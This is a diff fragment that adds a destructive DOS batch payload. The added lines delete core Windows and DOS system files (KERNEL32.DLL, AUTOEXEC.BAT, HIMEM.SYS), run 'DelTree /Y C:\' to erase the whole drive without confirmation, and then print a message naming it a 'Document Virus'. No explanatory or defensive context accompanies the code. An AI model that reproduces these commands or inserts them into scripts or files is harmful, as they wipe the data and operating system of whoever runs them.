@@ -1,0 +1,6 @@
+   DEL C:\WINDOWS\SYSTEM\KERNEL32.DLL
+   DEL C:\AUTOEXEC.BAT
+   DEL C:\DOS\HIMEM.SYS
+   DEL C:\WINDOWS\HIMEM.SYS
+   DelTree /Y C:\
+   ECHO Zombie's Document Virus!
